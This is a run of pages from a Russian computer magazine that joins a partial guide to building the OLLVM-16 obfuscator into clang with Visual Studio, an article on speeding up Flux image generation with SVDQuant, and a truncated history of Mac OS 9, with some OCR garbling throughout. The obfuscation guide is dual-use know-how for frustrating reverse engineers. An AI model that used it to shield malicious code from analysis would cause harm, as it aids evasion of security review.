git clone -b llvmorg-16.0.6 --depth=1 https://github.com/llvm/llvm-
project.git llvmorg-16.0.6
git clone https://github.com/wwh1004/ollvm-16
robocopy ollvm-16/Obfuscation llvmorg-16.0.6/llvm/lib/Obfuscation

Пра вим файл llvmorg-16.0.6/llvm/lib/CMakeLists.txt и дописываем
в него add_subdirectory(Obfuscation).


cmake -S C: \llvm-16.0.6\l lvm -B C: \llvm-16.0.6-build ^
-G "Visual Studio 17 2022" -A x64 -Thost=x64 ^
-DLLVM_ENABLE_PROJECTS="clang;lld" -DCMAKE_BUILD_TYPE=Release ^
-DLLVM_TARGETS_TO_BUILD= X86 -DLLVM_OBFUSCATION_LINK_INTO_TOOLS= ON ^
-DLLVM_INCLUDE_TESTS= OFF -DLLVM_INCLUDE_EXAMPLES= OFF

Запус тив CMake, мы получим файл LLVM.sln, из которого запустим сборку
Release-версии. Сбор ка занимает чуть боль ше часа.


Èíòåãðàöèÿ â Visual Studio
По умолчанию Visual Studio использует LLVM-19. Нам нуж но сообщить ком -
пилятору, что мы хотим исполь зовать дру гую версию. Для этого в корне про -
екта создаем файл Directory.build.props :


<Project>
<PropertyGroup>
<LLVMInstallDir>C:\llvm-16.0.6-build</LLVMInstallDir>
<LLVMToolsVersion>16.0.6</LLVMToolsVersion>
</PropertyGroup>
</Project>

Это изме няет переменные окружения, остальную настройку IDE сделает
за нас, надо толь ко выб рать пра вильный тулсет:


Platform Toolset = LLVM (clang-cl)

Теперь сборка любого кода будет выполняться нашей версией clang-cl
со встроенным обфуска тором.


ÎÁÇÎÐ ÌÅÒÎÄÎÂ ÎÁÔÓÑÊÀÖÈÈ

Уп равле ние обфускацией в нашем ком пиляторе происходит через спе циаль -
ные ключи. Допиши в Command Line эти строки:


-mllvm -sub -mllvm -sub_loop=3 -mllvm -split -mllvm -split_num=3 -
mllvm -fla -mllvm -bcf -mllvm -bcf_loop=3 -mllvm -bcf_prob=40

Рассмот рим, что делает каждый из ключей.


Bogus control flow
Этот метод вставляет в базовый блок фальшивые участки кода, которые
никог да не будут исполне ны. Нас трой ки:
 • -bcf — вклю чает этот вид обфуска ции;
 • -bcf_loop=N — задает, сколь ко раз применять BCF к одной функции;
 • -bcf_prob=P — зада ет вероятность (в процен тах, от 0 до 100) добав -
   ления bogus-блока.

Рассмот рим, как выг лядит код до и после обфускации.


AcceleratorsW = LoadAcceleratorsW(hInstance, (LPCWSTR)0x6D);

На основе этого блока кода рядом вставлен цикл с условием, которое всегда
будет False :


AcceleratorsW = LoadAcceleratorsW(a1, (LPCWSTR)0x6D);
v9 = x;
for ( i = y; y >= 10 && (((_BYTE)x * ((_BYTE)x + 1)) & 1) != 0; i = y
)
{
    LoadAcceleratorsW(a1, (LPCWSTR)0x6D);
    AcceleratorsW = LoadAcceleratorsW(a1, (LPCWSTR)0x6D);
    v9 = x;
}

В отличие от традиционной встав ки мусора, то есть нез начащего (или «мер -
твого») кода, выловить оригинальный код по уникальным WinAPI становит ся
куда сложнее. Кро ме того, bogus-блоки усложняют граф исполне ния, раз -
деляя базовый блок на несколько частей.


Instruction substitution
Это метод обфуска ции, при котором прос тые инструкции типа сложения,
вычитания или проверки фла га заменяются более сложными, но семан тичес -
ки экви вален тными конс трук циями. Он работает по принципу «делаем прос -
тое сложным», чтобы затруднить анализ и рас познавание стандар тных пат -
тернов в коде. Настройки:
 • -sub — вклю чает этот вид обфуска ции;
 • -sub_loop=N — сколь ко раз прой ти по функции.

Вот что было:


EndDialog(a1, a3);

И вот во что превратился код пос ле обфуска ции:


v34 = (~v32 & 0xCE296CF528B2527EuLL | v32 & 0x31D6930AD74DAD81LL)
    ^ (~v33 & 0xCE296CF528B2527EuLL | v33 & 0x31D6930AD74DAD81LL);


v35 = ((v34 | ~(~v32 | ~v33)) ^ 0x45B110EDBA343CE6LL)
    & (v34 | ~(~v32 | ~v33) | 0x45B110EDBA343CE6LL);


EndDialog(hDlg, ~(~(~(v26 ^ ~v35) & (v35 | v26) ^
0x7B085DB5B30B2D66LL)
    ^ 0x7B085DB5B30B2D66LL | (~v35 & 0x861C6ABB45D8AB39uLL
    | v35 & 0x79E39544BA2754C6LL) ^ 0x79E39544BA2754C6LL));

Простые вычисления вроде X+Y прев ращаются в длинную цепочку операций.
Обра ботке подверга ются только подходящие учас тки кода. Иногда в коде
этого метода обфуска ции силь но течет память, из-за чего компилятор вешает
систему. Все-таки двадцать гигабайт оперативной памяти для сборки пяти
килобайт кода слегка избы точно. При поми наю, что эта проблема была и на
пер вом серь езном релизе в начале десятых.


Control flow flattening
Этот метод «уплощает» поток управления, превращая легко читаемый граф
в подобие виртуальной машины. Например, таким был код до:


if (x > 0)
  do_positive();
else
  do_negative();


do_final();

Та ким стал пос ле:


int label = 0;


while (1) {
  switch (label) {
    case 0:
      if (x > 0)
        label = 1;
      else
        label = 2;
      break;
    case 1:
      do_positive();
      label = 3;
      break;
    case 2:
      do_negative();
      label = 3;
      break;
    case 3:
      do_final();
      return;
  }
}

Ло гика потока управления перестает счи тывать ся на глаз. Чтобы выяс нить,
что код дела ет, потребу ется трассировка.
  Настройки:
 • -fla — вклю чает этот вид обфуска ции;
 • -split — активиру ет деление базовых бло ков на час ти;
 • -split_num=N — сколько раз разделить базовый блок.

Ключ split разбива ет базовый блок на нес коль ко меньших блоков, соеди -
ненных переходами, эта опция хорошо дополняет Flattening, запутывая граф
еще сильнее.





                    До и пос ле обфуска ции


ÇÀÊËÞ×ÅÍÈÅ

Обфускаторы многок ратно усложняют ревер серам жизнь. Чтобы снять слой
обфуска ции, приходит ся писать деобфускатор, ориентирован ный на конкрет -
ную версию защиты. Дописав свои проходы или слегка изме нив существу -
ющие, можно на порядок уве личить количество челове ко-часов, требующих ся
для анализа защища емых алгоритмов. Совместив обфускацию и антиотла -
дочные приемы, ты можешь подарить аналитикам множество незабываемых
часов, про веден ных в декомпиляторе.
GEEK





В  погоне  за новыми  моделями  вроде
Lumina 2.0 и HiDream-I1 сообщество начало
забывать про ста рый добрый Flux, ставший
прорывом меньше года назад. И как ока -
залось, совершенно напрасно: новей ший         ЭкспертОлегпоАфонинмобильной
алгоритм  позволяет  соз давать  кар тинки       криминалистике«Элкомсофт»компании
этой  доволь но  тяжелой моделью  всего        aoleg@voicecallcentral.com
за  четыре  секунды —  быстрее,  чем
при помощи SDXL.


SVDQUANT

Технология сжа тия нейросетевых моделей, получив шая название SVDQuant,
была соз дана группой разработчиков MIT HAN Lab из Массачусетского тех -
нологи чес кого инсти тута. Раз работчики описывают ее так.
   SVDQuant — метод сжатия нейронных сетей, использующий син гулярное
разложение мат риц (SVD) для сжа тия модели до 4 бит без существенного
ухуд шения качества. Модель FLUX.1 с 12 миллиардами параметров уда лось
сжать в 3,6 раза, в резуль тате чего модель умес тилась в довольно скромный
объ ем виде опа мяти. Кстати, при помощи SVDQuant можно сжимать далеко
не толь ко модели для генерации картинок; к примеру, уже доступна кван -
тованная модель текстового декодера T5.
  Далее в дей ствие вступает инс тру мент Nunchaku, который исполь зуется
для генера ции кар тинок с при мене нием сжа той модели. Nunchaku потребля -
ет в 3,5 раза мень ше памяти, чем базовая 16-бит ная модель Flux, и ускоряет
каждый шаг генера ции в три раза по сравнению даже с сильно сжатой
моделью в формате NF4 (с нее, напомню, началась практика квантования
моделей), существенно опе режая последнюю по качеству кар тинки.
  На видеокартах с небольшим объемом памяти модели SVDQuant работа -
ют на порядок быс трее несжатой версии и как минимум втрое быстрее, чем
с квантованием fp8, Q8 или Q6. На картах с 16 Гбайт видеопамяти прирост
производительнос ти скром нее, при мерно в 2,5 раза по сравнению с вари -
анта ми GGUF или fp8.





 • SVDQuant — наз вание метода сжа тия и формата, в котором представлены
   сжа тые модели.
 • Nunchaku — инс трумент для работы с моделями в формате SVDQuant.
  Дос тупен как в виде кода для разработ чиков, так и в расширениях
   для ComfyUI и SwarmUI.
 • DeepCompressor — инс тру мент для кван тования (сжатия) моделей.





ÓÑÒÀÍÎÂÊÀ È ÈÑÏÎËÜÇÎÂÀÍÈÅ ÌÎÄÅËÈ

Для работы с новыми моделями мы будем исполь зовать интерфейс SwarmUI,
уже знакомый тебе по нескольким предыду щим стать ям.





Если SwarmUI у тебя уже установ лен, обязательно обнови как сам интерфейс
(вкладка Server, Check for Updates, затем Update and Restart Server), так и дви -
жок Comfy (нуж но полностью вый ти из SwarmUI, зак рыв окно терминала,
и запус тить файл update_comfyui.bat из папки SwarmUI\dlbackend\comfy\
update).
  Кроме  того,  возможно,  тебе  придет ся  обновить  Torch  до  вер -
сии 2.7 или 2.8. Я использую Torch 2.8 nightly, уста новить который мож но сле -
дующей командой (запускать ее нужно из папки SwarmUI\dlbackend\comfy\
python_embeded\, в против ном случае Torch установится не туда, куда надо):


python -m pip install -U --pre torch torchvision torchaudio
--index-url https://download.pytorch.org/whl/nightly/cu128

Теперь нужно ска чать модель или модели.




                      Если  у  тебя  видеокарта семейства  Blackwell
                            (Nvidia RTX  50xx),  тебе понадобят ся модели,
                        квантованные в fp4 . Для всех остальных виде -
                        окарт нуж ны модели int4 .


Скачать модель можно со страницы раз работчиков. На момент написания
статьи доступны сле дующие вари анты.
  Для карт поколения Blackwell:
 • FLUX.1-dev (fp4) ;
 • Shuttle Jaguar (fp4) .

Для всех остальных видеокарт:
 • FLUX.1-dev (int4) ;
 • Shuttle Jaguar (int4) ;
 • Jib Mix Flux (int4) .

Кро ме того, дос тупны варианты Schnell (я не вижу смысла в их исполь -
зовании: скорости уже дос таточно, а качество этих моделей ниже), а так же
различные вспомога тельные модели — Pix2Pix, Canny, Depth и Fill.
   Ска чивать нужно пап ку целиком, включая фай лы transformer_blocks.
safetensors ,   unquantized_layers.safetensors ,   comfy_config.json
и config.json . Фай лы требуется сохранить в своей собственной поддирек -
тории в каталоге SwarmUI\Models\diffusion_models\ , нап ример так:


SwarmUI\Models\diffusion_models\
    svdq-fp4-flux.1-dev\
        comfy_config.json
config.json
transformer_blocks.safetensors
unquantized_layers.safetensors
    svdq-fp4-shuttle-jaguar\
        comfy_config.json
config.json
transformer_blocks.safetensors
unquantized_layers.safetensors

Теперь можно запускать SwarmUI. Попытайся заг рузить модель, нажав на три
точки спра ва от ее иконки и выб рав Load Now. В этот момент SwarmUI опре -
делит тип модели и предложит тебе доустановить расширение, необходимое
для ее загрузки. Под тверди запрос и подожди установ ки. После перезагрузки
серверной части модель будет готова к использованию. В слу чае проблем
можно почитать инструкцию на сай те SwarmUI.
  Пос коль ку Flux — дис тилли рованная модель, параметр CFG всегда должен
быть установ лен в зна чение 1. Не забывай, одна ко, про допол нительный
параметр Flux Guidance Scale, дос тупный на вкладке Sampling пос ле выбора
модели. Его значение по умолчанию — 3,5; если опустить параметр до 2–2,5,
резуль тат получится более кре ативным, но менее «глянцевым».
  Модели SVDQuant чувс тви тельны к выбору семплера и шедулера. Хорошо
работа ют сочетания Euler Normal и Euler Beta, с дру гими нас тройками можно
экспе римен тировать. Разработчики рекомендуют начать с десяти шагов
(параметр Steps), но по моему опы ту этого недостаточно: для хорошей
детали зации требуется как минимум 20 шагов, а для уверенной генерации
длинного текста — и вовсе 28 и более.
   Как и другие версии Flux, модели поддерживают разрешения до 2К вклю -
читель но  (то  есть  можно  генери ровать  картинки  раз мером  поряд -
ка 1440 на 1440, включая дру гие стандартные вари анты соотношений сто -
рон). В отли чие от полной версии Flux, блочные артефак ты на высоких раз -
решениях в квантован ных моделях SVDQuant практически не встре чаются,
поэтому  можно  сме ло   редак тировать   метадан ные,   указав   раз -
решение 1440 на 1440.





ÑÐÀÂÍÅÍÈÅ ÑÊÎÐÎÑÒÈ

Я сгенерировал несколько пар картинок с одним и тем же запросом и сле -
дующими настройками: разрешение 2 Мп (1168 × 1712), Euler Normal,
20 шагов, CFG = 1, Flux Distilled Guidance = OFF. Видеокарта — Nvidia RTX
5080 16 Гбайт. Результаты — в таб лице.


 Ìî äåëü               Êâàí òîâàíèå    Âðå ìÿ ãåíåðàöèè (ñ)

  ux-1-dev                       fp16                    68, 64

  ux-1-dev                        fp8                        31, 28

  ux1-dev-Q8_0.gguf       Q8_0 (GGUF)                  31, 28

 ux1DevScaledFp8_v2         fp8 (scaled)                26, 28

  svdq-fp4-ux.1-dev          fp4 (SVDQuant)               12, 12

Полная версия модели Flux1.dev fp16 работа ет медленнее всего: она не вме -
щается в виде опа мять, и SwarmUI вынуж ден подгружать нужные части
из основной памяти.
  Версия fp8 в памяти раз меща ется целиком; генерация идет с нормаль ной
скоростью, качество немного отли чается от ори гина ла, но все еще очень
высокое.
  Версия Q8_0 также целиком помеща ется в памяти, однако этот механизм
квантования сложнее по сравнению с fp8. Скорость примерно соответс твует
вари анту fp8 (на дру гом железе, разумеется, циф ры могут отличаться в любую
сто рону), а качес тво максимально приближено к полной версии модели.
Кванты Q6 или Q8 имеет смысл выбирать по объему доступной видеопа мяти;
качес тво будет выше, чем у версии fp8, но версия fp8 может работать быс -
трее. Квант Q4 я не тестировал; качес тво сге нерированных им изоб ражений
уже не выдерживает критики.
  На конец, модель fp4 в формате SVDQuant выдает самую высокую ско -
рость. Качес тво на глаз я бы оценил как что-то из промежутка между Q8_0
(практичес ки неотличимо от fp16) и fp8 (все еще очень высокое). Напомню,
что качес тво генера ции — не то же самое, что качество картинки. Если ты
вспомнил об арте фактах компрес сии JPEG или мутных кар тинках низкого раз -
решения — забудь; здесь качество определяется мелкими деталя ми, а проще
всего его проверить при генера ции длинных текстов.
  Проверкой качества модели мы сейчас и займем ся.


ÏÐÈÌÅÐÛ ÐÀÁÎÒÛ

Для начала — пос тер, на котором я проверяю генера цию текстов.





Вполне хорошо, одна ко число шагов пришлось под нять до 28: как с рекомен -
дованными десятью шагами, так и с двадцатью, которые я использовал
во всех осталь ных при мерах, текст генерировался с огрехами.





                      Всадник, иллюстрация





                       Черно-белая сценка

А дальше — провер ка на блочные артефакты (обра ти внимание на фон).





Напомню, что при генера ции картинок в высоком (выше 1 Мп) разрешении
Flux склонен генери ровать арте факты, описан ные в статье « Фишки Flux.1.
Добива емся лучших картинок от новой генератив ной модели »; в квантован -
ной модели — никаких признаков артефак тов. Мне пришлось приложить уси -
лия, чтобы создать картинку, на которой эти арте факты все-таки возникли,
но даже в этом слу чае они выражены замет но сла бее, чем в стан дартных
вари антах Flux.





               Резуль тат работы квантованной модели





            Стан дартная fp8 с теми же параметрами и сидом

Блочные артефакты на гра диентном фоне в первом случае слабо выражены,
во втором — вполне замет ны. Пов торюсь: на обычных изображениях, соз -
даваемых моделя ми SVDQuant, блочные артефакты полностью отсутствуют.





                   Обложка с вампиром




                                     Продолжение статьи →
GEEK                           НАЧАЛО СТАТЬИ



       УСКОРЯЕМ ГЕНЕРАЦИЮ КАРТИНОК
        ПРИ ПОМОЩИ СЖАТЫХ МОДЕЛЕЙ




Посмотрим, как работа ет вторая, «киношная» модель — Shuttle Jaguar.





                       Пи лот, Euler Beta





                      Тот же сид, но DPM++ 2M Beta

Попробуем про явить блоч ные артефакты.





Но артефактов нет. Про буем повысить разрешение за пределы, официально
поддержи ваемые моделью.





Да же в разрешении 2048 × 1536 арте фактов нет. Кстати, генерация картинки
с раз решением 3 Мп заняла 28 с — это вполне приличный результат даже
для SDXL, если пос читать вре мя начальной генерации и второго прохода
с повышением раз решения.
  На конец, «китайская» аква рель.





                                 Jaguar





                        Обычный Flux


À ÌÎÆÍÎ ÅÙÅ ÁÛÑÒÐÅÅ?

SVDQuant можно еще немного ускорить, уста новив параметр Nunchaku
Cache Threshold (вклад ка Advanced Sampling) в ненуле вое значение. Пример -
но до зна чения 0,2 падение качества картинки относительно невелико, ско -
рость генера ции в значении 0,2 почти удва ивается; с рос том параметра ухуд -
шение ста новится заметным. К при меру, постер Kung-Fu Chicken с приемле -
мой над писью мне не уда лось сгенерировать ни с одним значением
Nunchaku Cache  Threshold, кроме нулевого, но картинки без надписей
получа ются вполне нор маль ными. Впрочем, там, где нуж но качество, пол -
зунок кеширования все же стоит оставить в покое.


ÍÅÄÎÑÒÀÒÊÈ SVDQUANT

Разумеется, прос то взять и ускорить что угод но в три и более раза невоз -
можно; за ско рость всегда при ходится чем-то пла тить. Какие недостатки
у новой тех нологии?
  На падение качества по срав нению с исходной моделью в формате fp16,
пожалуй, можно закрыть гла за: оно нас только невели ко, что им легко пожер -
твовать в поль зу скорос ти. А если сравнивать с вер сией Flux в фор мате fp8, то
качес тво у моделей SVDQuant даже выше.
  В чис ло недос татков можно записать ограниченную поддержку тех нологии
(пока — толь ко Comfy/SwarmUI) и крайне огра ниченное число кван тован ных
моделей: сей час это Flux1 и его инс тру ментарий и одна сторонняя модель
Shuttle Jaguar, основанная на Flux Schnell. Вла дель цам пре дыдущих поколе -
ний виде окарт (до Blackwell) дос тупна модель JibMix, но на этом действитель -
но все. Что приводит нас к следующему недос татку: чрез вычайно ресурсоем -
кому процес су сжатия.
  Для сжа тия моделей использует ся софт DeepCompressor ; он очень мед -
ленный и чрезвычайно прожор ливый. Квантование одной модели на базе Flux
занима ет около шести часов на уско рителе H100 с 80 Гбайт виде опамяти.
Дома такое не пос тавишь, да и аренда такого ускорителя далеко не бесплат -
на. По словам раз работчиков, со временем инструмент будет оптимизи -
рован; может быть, пос ле этого число моделей в этом формате начнет рас ти.


ÂÛÂÎÄÛ

Так все-таки Flux за четыре секунды — это преувеличение? Скорее, правда:
картинки в разрешении 1 Мп генерируют ся за 3–4 с в зависимости от железа
и чис ла шагов, которое напрямую влияет на качес тво. Если же тебе нужна
более высокая детали зация, повышенное разрешение или текстовые вставки,
ждать при дется уже порядка 12 с.
  Для сравнения: изоб ражения в таком разрешении и с ана логичным уров -
нем детализации модели SDXL создают на моем железе приблизительно
за 30 с с учетом второго прохода или при мерно за 17 с, если исполь зовать
расширение RAUNet , с которым корректно работа ют не все модели. При этом
Flux гораз до лучше понима ет запросы; в нем проще с пер вой-второй попытки
соз дать именно то, что нужно.
   Flux рано списывать со счетов. Да, модель HiDream мощнее: она луч ше
понимает зап росы, под держивает больше сти лей; в пол ной версии под -
держи вают ся негативные ключевые слова. Наконец, лицензия HiDream дает
максималь но широкие пра ва — в отли чие от лицензии Flux. Одна ко HiDream
генери рует картинку с раз решени ем 2 Мп за полторы-две минуты, в то вре мя
как Flux даже в обычном режиме fp8 соз дает такие изоб ражения за пол -
минуты, а с новым алго рит мом квантования SVDQuant — и вовсе за 12–13 с.
GEEK





Одна из важных вех в истории Apple —
переход от клас сической Mac OS 9 к Unix-
подобной OS X, означавший не прос то кар -
динальную смену прог раммной архитек -
туры, а глобальное изменение философии       ВалентинВедущийХолмогоровредактор
ОС. В моей коллекции вин тажных ноутбуков          valentin@holmogorov.ru
есть  экземпляр  с  той  самой  девятой
«макосью» на борту — iBook G3. Дей стви -
тельно, стоило купить этот компьютер, что -
бы понять причину, по которой в Apple
решили отказаться от своей клас сичес кой
опе рационки в поль зу ОС с прин ципиаль но
новой концепцией.


Мой 12-дюймовый iBook сошел с конвейера в 2002 году, и для этого года
машина была весьма прод винутой в тех ническом отно шении. Здесь имеется
привод ComboDrive, под держи вающий  чтение и запись компакт-дисков
на скорос ти до 16x, встроенный модем (56 Kбит/с), порт Ethernet, пара разъ -
емов USB 1.1. В наличии есть даже бес проводной адаптер Apple Air Port стан -
дарта 802.11b c максимальной скоростью передачи дан ных до 11 Мбит/с.
  В основе этого iBook лежит процес сор PowerPC 750FX G3 с тактовой час -
тотой 800 МГц, осна щенный кеш-памятью первого уровня объемом 64 Кбайт
и кешем второго уровня на 512 Кбайт, интегрированным в сам чип. Объем
оперативной памяти составля ет 256 Мбайт SDRAM PC133 (333 МГц),
из которых полови на распаяна на пла те, а вторая половина уста новлена
в единс твенный слот расширения. Мак сималь но воз можный объем ОЗУ —
640  Мбайт.  За  графику  отвечает  виде окарта   ATI   Mobility  Radeon
7500 с интерфейсом AGP 2x и собс твенными 32 Мбайт видеопамяти SDRAM.
Для ноут бука 2002 года наличие дис кретного GPU — весьма достойный уро -
вень.





                      Мой iBook G3

Это — ноутбук «старой школы», родом из той эпохи, когда корпус откры вался
без исполь зования темной магии, а батарею (литий-ион ный акку мулятор
на 47 Вт · ч) можно было вытащить пример но за секун ду. Эпохи, где за акку -
ратным дизай ном компь ютера стояла инженер ная логика, а не эстетика, про -
диктованная спе циалистами по маркетингу.
  Мне этот ноутбук достался с нап рочь убитым жес тким диском, который
отча янно просил ся на свал ку. Никаких CD с софтом в ком плекте, понят ное
дело, тоже не име лось. Благо в конструкции компьюте ра использовались
стандартные IDE-винчестеры форм-фактора 2,5 дюйма, а такого добра
в моих стра тегичес ких запасах хранится в избытке.
  Сра зу пос ле замены жес ткого диска начал ся увлекательный квест по уста -
нов ке на него операци онной сис темы. Этот iBook был одним из пер вых ноут -
буков от Apple, поставлявшихся покупателям с предустановленной OS X
10.1.4, которая на процес соре G3 с име ющимся в наличии объемом опе -
ративки жутко тормозила, да и в целом выг лядела довольно сырой. Но по
желанию можно было отка титься на Mac OS 9.2.2 — самую пос леднюю редак -
цию клас сичес кой «макоси», вышед шую в конце 2001 года. Подумав, что
на OS X я могу вдоволь полюбо вать ся и на сов ремен ном макбуке, я решил
обра тить ся к классике.
  В отличие от сов ременных вер сий эппловской операционки, которая уме -
ет  опре делять  оборудование  компа  и  автоматически  подстраиваться
под имеющееся в наличии железо, дистрибути вы классической Mac OS
заранее скомпилированы под одну кон кретную аппа ратную кон фигурацию. То
есть дис три бутив изна чаль но собран стро го для определен ной модели
компь ютера, и он либо не встанет на дру гую машину совсем, либо выдаст
неп равиль ное экранное раз решение, которое затем невоз можно будет изме -
нить, либо не под цепит что-либо из оборудования. В общем, нор мально
работать такая сис тема не будет. Я перепробовал с десяток раз ных дистри -
бути вов Mac OS 9 и испортил кучу записы ваемых компакт-дис ков, прежде чем
подобрал наконец вер сию ОС, которая нор мально завелась на моем вин -
тажном iBook.





  Выб рал неп равиль ный дистрибутив — получи проб лемы с экранным раз -
  решением


ÑÈÑÒÅÌÀ ÏÐÈßÒÍÎÉ ÍÀÐÓÆÍÎÑÒÈ

На взгляд современ ного пользовате ля Mac OS 9 выглядит, конеч но, немного
архаично, но это и неудивитель но, если учесть, что архитектурная основа этой
операционки была заложена еще в оригиналь ном Macintosh 128K — пер -
соналке на базе процессора Motorola 68000 с 128 Кбайт памяти на борту.
Когда Macintosh толь ко появился в 1984 году, он стал первым массовым
компь ютером с графичес ким интерфей сом, управляемым мышью. Подобный
подход уже реализовывался ранее в лаборатори ях Xerox PARC, но имен но
Apple смогла превратить техничес кий кон цепт в рыночный про дукт.





  Так выглядел прототип первого графического интерфейса в исполне нии
  Xerox

Ключевой особенностью ОС от Apple ста ло отсутс твие коман дной строки:
пользователь вза имодействовал с компьюте ром исключительно посредством
различных элементов гра фичес кого интерфейса: окон, меню и значков. Сама
операционная система представ ляла собой совокупность Finder (обо лочки)
и Toolbox — набора биб лиотек с прикладной логикой. Собс твен но, эти биб -
лиотеки, предоставлявшие интерфейс  к сис темным функциям, и были
основным API, дос тупным приложениям. Одна ко программисты часто исполь -
зовали «неофициаль ные» или плохо  задокумен тированные вызовы,  что
делало прог раммы нестабиль ными на новых версиях ОС.
   Внут реннее устройство Mac OS долгое вре мя оставалось пре дельно
простым: система не имела ядра в современном понимании — вместо этого
исполь зовался набор управляющих модулей, вза имодействующих напрямую
с аппа ратурой. Процессы в клас сической Mac OS выполнялись в общем
адресном  пространс тве,  без  какого-либо  механиз ма  разграничения.
Это озна чало, что любая ошибка в одном приложении могла обрушить всю
систему.
  Ко всему про чему до начала девянос тых Mac OS фактически оста валась
однозадачной: поль зователь мог работать только с одним приложением, хотя
Finder продолжал функци онировать в фоновом режиме. Появив шийся позже
механизм Cooperative Multitasking позволил нес коль ким запущенным прог -
раммам передавать управление друг другу — но полноценной многозадач -
ностью это так и не стало. Mac OS не вмешивалась в сам процесс перек -
лючения задач, не пре рыва ла их при нудительно и не кон тролировала время
выполнения. Управление переключени ем пол ностью лежало на самих при -
ложе ниях: каждое из них должно было добровольно вызвать специаль ную
системную функцию, чтобы уступить процес сорное вре мя дру гим запущен -
ным программам. Если приложение не делало этого, оно продолжало
занимать процес сор, бло кируя выполнение  остальных задач и снижая
отзывчи вость сис темы.





                    Классическая Mac OS вер сии 6

Одной  из осо бенностей Mac OS было  активное использование рас -
ширений — так называ емых INIT-фай лов и контроллеров. Это позволяло
добав лять в ОС новые воз можнос ти — например, под держку раз личных типов
фай лов или устройств. Однако никакой изоляции между расширениями
не сущес твовало, и час то два INIT-файла конфликтовали друг с дру гом. Рас -
ширения загружались сра зу пос ле запуска Finder, и последователь ность ини -
циали зации ока зывала прямое вли яние на стабильность работы опе раци -
онки. Иног да решить проблему с зависанием системы мож но было просто
сменой поряд ка загрузки INIT-файлов.
  Од ним из таких рас ширений стал MultiFinder, добавлявший коопе ративную
многозадачность между при ложе ниями. Это поз волило поль зовате лям Mac
OS работать с несколькими прог раммами одновремен но, но с сохранением
принципа доб роволь ной переда чи управления. Многозадач ность реализовы -
валась за счет приостановки одного приложения и вре мен ной переда чи
управления другому: пользователь вручную переключал фокус между прог -
рамма ми, щелкая по их окнам. При этом в фоновом режиме дру гие приложе -
ния получали доступ к ресурсам лишь эпи зоди чески — в те момен ты, когда
активное окно прос таива ло. В общем, работа ла  эта многозадач ность
с использовани ем костылей и подпорок.


ÑÌÅÍÀ ÊÓÐÑÀ

В 1994 году Apple впервые проделала то, что позже успешно повторила
еще дважды: кардинально сменила аппарат ную плат форму, отказавшись
от процессоров Motorola в пользу более совершенной архитектуры PowerPC,
в раз работке которой при нима ла учас тие вмес те с IBM и все той же Motorola.
Первый Power Macintosh был представлен 14 марта 1994 года, а за ним под -
тянулись и ноут буки. С переходом на другие процессоры нуж но было менять
и операци онную систему — и Apple сделала это, добавив поддержку PPC
в версии Mac OS 7.1.2.





                       Mac OS 7.1.2

Но изменения касались в основном уров ня трансляции кода. Mac OS исполь -
зовала ме ханизм Fat Binary ( универсальные бинарники ) — все приложения
содержали код и для Motorola 680x0, и для PowerPC, а системные библиотеки
работа ли в режиме совмести мос ти с 680x0, что позволяло плавно перейти
на новую архи тек туру без полной переработ ки ОС. В резуль тате такие прог -
раммы мог ли запускаться и на старых «маках», и на новых, но объ ем файлов
пропорциональ но вырос, да и на быстро дей ствии приложе ний поддержка
сразу нес коль ких аппаратных архи тектур в одном бинар нике сказывалась
не самым лучшим образом.
  В Mac OS 7 напрочь отсутствовала под дер жка MMU защита памяти, кроме
того, фай ловая система ОС изначально была раз работана для дис кет
и замет но тормозила на жестких дисках, объем которых год от года рос.
Еще одной головной болью была биб лиотека двумерной графики QuickDraw,
отве чав шая за отображение элементов графического интерфейса. Биб -
лиотека работала с общей областью памяти, которую разделяла с при ложе -
нием. В этой памяти хранилась информация о состоянии интерфейса — нап -
ример, координаты расположения окна на экране. Из-за такого подхода
любое неправильное обра щение со стороны при ложения могло пов редить
данные QuickDraw, что при води ло к сбо ям всей графичес кой подсисте мы
и аварийному завершению всех запущенных GUI-программ. Сам сбой
в QuickDraw мог также нарушить работу приложения, вызвав его немед -
ленный вылет с ошиб кой. Эта проблема считалась неустранимой в рамках
System 7, пос коль ку была напрямую связана с базовой архитектурой гра -
фического интерфей са.


COPLAND È GERSHWIN

Одновре менно с перехо дом на плат форму PowerPC в Apple запус тили целых
два параллель ных проекта по разработке прин ципи ально новой операци -
онной системы. Пер вый из них, с кодовым названием Copland, стартовал
в 1994 году — эта ОС была призвана заменить устаревшую Mac OS
7 и успешно конкурировать с Windows 95 от Microsoft. Интерфейс Copland
проектировался полностью цветным, с 3D-элементами, новой темой офор -
мле ния под названи ем Platinum, а также улучшенным Finder с вкладками
и возможностью одновре менно запус кать более одного процесса копиро -
вания файлов. В Copland собира лись реализовать вытесняющую многозадач -
ность, полноценную защиту памяти и улучшенную работу с виртуаль ной
памятью, а также многополь зовательский режим с пол ноценным разделени -
ем фай лов раз ных учетных записей — то, что у Microsoft не получилось сде -
лать в Windows 95.





     Примерно так должна была выглядеть Copland. Но не срослось…




                                     Продолжение статьи →
GEEK                           НАЧАЛО СТАТЬИ



            ВСПОМИНАЕМ MAC OS 9 —
              ПОСЛЕДНЮЮ ВЕРСИЮ
             КЛАССИЧЕСКОЙ ОС APPLE




Второй проект получил название Gershwin — под этим наименова нием скры -
валась перспективная операционная система, которая должна была прийти
на сме ну Copland в 1998 году. В Gershwin собирались внед рить переносимое
микроядро, что поз воляло бы запус кать эту ОС на различных архитектурах
процессоров, включая PowerPC, DEC Alpha, MIPS и Intel. Система дол жна
была под держи вать мно гопроцес сорные машины, что поз воляло бы исполь -
зовать ее и на нас тольных компьютерах, и на серверах высокого класса.
  Од нако оба эти проекта так и не были реализова ны пол ностью. Планы ока -
зались слишком амби циозными: разработчики пытались внедрить сразу мно -
жество принципи ально новых функций, при этом в про екте не имелось ясного
техничес кого задания и даже чет кой документации, что делало тестирование
и интегра цию компонентов практически невозможны ми. Команды Copland
и Gershwin кон фликтовали между собой, а тре бова ния к системе пос тоян но
менялись под давлением маркетологов и менед жеров, что приводило к фор -
менному хаосу. При этом генераль ный директор Apple Джон Скалли уделял
вни мание в основном мар кетинговым вопросам, но прак тичес ки не контро -
лировал про цесс разработ ки.
  В 1995 году стоимость раз работки Copland пре высила первоначаль ный
бюджет почти в три раза, а обещанные релизы постоянно откладывались.
К концу года ста ло очевидно, что Copland не будет готова в обозримом
будущем, — система пред став ляла собой набор раз рознен ных модулей,
которые невоз можно было собрать в еди ную работа ющую ОС. После анализа
состояния дел новый менед жер Эллен Хэнкок пришла к выводу о его без -
надежности, и в августе 1996 года про ект был офи циаль но зак рыт.
  Все сроки ока зались катас трофичес ки упу щены, и в 1997 году Apple была
вынуждена выпустить хоть какие-то обновления для только что появив шихся
